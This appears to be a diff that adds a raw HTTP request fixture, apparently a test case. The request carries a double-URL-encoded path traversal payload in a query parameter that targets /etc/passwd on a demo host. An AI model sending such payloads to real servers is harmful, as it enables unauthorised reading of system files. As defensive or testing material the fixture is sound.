@@ -1,0 +1,4 @@
+GET /a?data=%252e%252e%2F%252e%252e%2F%2Fetc%2Fpasswd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
